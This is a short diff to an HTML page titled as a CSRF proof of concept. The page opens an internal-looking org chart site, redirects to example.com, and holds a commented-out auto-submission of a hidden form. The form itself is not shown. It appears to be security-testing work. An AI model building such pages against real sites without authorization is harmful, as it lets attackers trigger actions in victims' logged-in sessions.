@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF PoC - should not send request</title>
+    <title>CSRF PoC - should redirect</title>
 </head>
 <body>
     <h1>CSRF Proof of Concept</h1>
@@ -14,7 +14,7 @@
     <script>
         // Open the org chart in a new tab or window
         window.open('https://orgchart/', '_blank');
-        window.close();
+        window.location.href = 'https://example.com';
         // Submit the CSRF form after a short delay to ensure the new window opens first
         //setTimeout(() => {
         //    document.getElementById('csrfForm').submit();
